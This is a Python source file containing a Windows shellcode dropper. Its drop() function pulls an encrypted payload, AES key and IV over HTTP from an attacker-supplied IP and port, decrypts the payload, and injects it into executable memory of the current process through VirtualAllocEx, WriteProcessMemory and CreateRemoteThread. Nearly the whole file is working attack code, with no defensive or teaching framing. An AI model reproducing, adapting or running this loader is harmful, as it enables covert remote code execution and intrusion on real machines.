import sys
import os
import ctypes
import time
from ctypes import *
from ctypes import wintypes
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
from Crypto.Cipher import AES


verbose = True


def drop(address):

    IP, PORT = address.split(":")
    if verbose is True: print(IP, PORT)

    URL = "http://" + IP + ":" + PORT + "/file"
    response = requests.get(URL)
    file = response.content

    URL = "http://" + IP + ":" + PORT + "/iv.bin"
    response = requests.get(URL)
    iv = response.content

    URL = "http://" + IP + ":" + PORT + "/key.bin"
    response = requests.get(URL)
    key = response.content

    cipher = AES.new(key, AES.MODE_CFB, iv=iv)
    content = cipher.decrypt(file)

    shellcode = content

    PROCESS_CREATE_PROCESS = 0x0080
    PROCESS_CREATE_THREAD = 0x0002
    PROCESS_DUP_HANDLE = 0x0040
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    PROCESS_SET_INFORMATION = 0x0200
    PROCESS_SET_QUOTA = 0x0100
    PROCESS_SUSPEND_RESUME = 0x0800
    PROCESS_TERMINATE = 0x0001
    PROCESS_VM_OPERATION = 0x0008
    PROCESS_VM_READ = 0x0010
    PROCESS_VM_WRITE = 0x0020
    PROCESS_ALL_ACCESS = PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_SET_INFORMATION | PROCESS_SET_QUOTA | PROCESS_SUSPEND_RESUME | PROCESS_TERMINATE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE

    MEM_COMMIT = 0x00001000
    MEM_RESERVE = 0x00002000
    MEM_RESET = 0x00080000
    MEM_RESET_UNDO = 0x1000000
    MEM_LARGE_PAGES = 0x20000000
    MEM_PHYSICAL = 0x00400000
    MEM_TOP_DOWN = 0x00100000

    PAGE_EXECUTE = 0x10
    PAGE_EXECUTE_READ = 0x20
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_EXECUTE_WRITECOPY = 0x80
    PAGE_NOACCESS = 0x01
    PAGE_READONLY = 0x02
    PAGE_READWRITE = 0x04
    PAGE_WRITECOPY = 0x08
    PAGE_GUARD = 0x100
    PAGE_NOCACHE = 0x200
    PAGE_WRITECOMBINE = 0x400

    class _SECURITY_ATTRIBUTES(ctypes.Structure):
        _fields_ = [('nLength', wintypes.DWORD),
                    ('lpSecurityDescriptor', wintypes.LPVOID),
                    ('bInheritHandle', wintypes.BOOL), ]

    SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
    LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
    LPTHREAD_START_ROUTINE = wintypes.LPVOID

    kernel32 = WinDLL('kernel32', use_last_error=True)
    process_id = os.getpid()
    shellcode_length = len(shellcode) + 1024
    if verbose is True: print("Shellcode Length:", shellcode_length)

    OpenProcess = kernel32.OpenProcess
    OpenProcess.restype = wintypes.HANDLE
    OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)

    process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
    if process_handle != 0:
        if verbose is True: print("Process Handle: ", process_handle)
    else:
        if verbose is True: print("Error from open: ", get_last_error())

    VirtualAllocEx = kernel32.VirtualAllocEx
    VirtualAllocEx.restype = wintypes.LPVOID
    VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD)

    memory_allocation = VirtualAllocEx(process_handle, None, shellcode_length, MEM_COMMIT,
                                       PAGE_EXECUTE_READWRITE)
    if memory_allocation is None:
        if verbose is True: print("Fetching base address failed: ", GetLastError())
    else:
        if verbose is True: print("Base Address: ", hex(memory_allocation))

    WriteProcessMemory = kernel32.WriteProcessMemory
    WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t,
                                   ctypes.POINTER(ctypes.c_size_t)]
    WriteProcessMemory.restypes = wintypes.BOOL

    bytes_written = c_ulonglong()
    wr = WriteProcessMemory(process_handle, memory_allocation, shellcode, shellcode_length, byref(bytes_written))
    if wr == 0:
        if verbose is True: print("Write process failed: ", GetLastError())
    else:
        if verbose is True: print("Write process memory success. Return Code: ", wr, "Check bytes written: ", bytes_written)

    CreateRemoteThread = kernel32.CreateRemoteThread
    CreateRemoteThread.restype = wintypes.HANDLE
    CreateRemoteThread.argtypes = (
    wintypes.HANDLE, LPSECURITY_ATTRIBUTES, ctypes.c_size_t, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD,
    ctypes.c_ulong)

    create_process = CreateRemoteThread(process_handle, None, 0, memory_allocation, 0, 0, 0)
    if create_process is None:
        if verbose is True: print("Failed to create remote thread", get_last_error())
    else:
        if verbose is True: print("Process initiation expected! Return Code: ", create_process)

    WaitForSingleObject = kernel32.WaitForSingleObject
    WaitForSingleObject.restype = wintypes.HANDLE
    WaitForSingleObject.argtypes = (wintypes.HANDLE, wintypes.DWORD)

    INFINITE = -1
    wait = WaitForSingleObject(create_process, INFINITE)
    if verbose is True: print("Waiting for process to pop up! ", wait)


try:
    address = sys.argv[1]
    drop(address)
except:
    address = False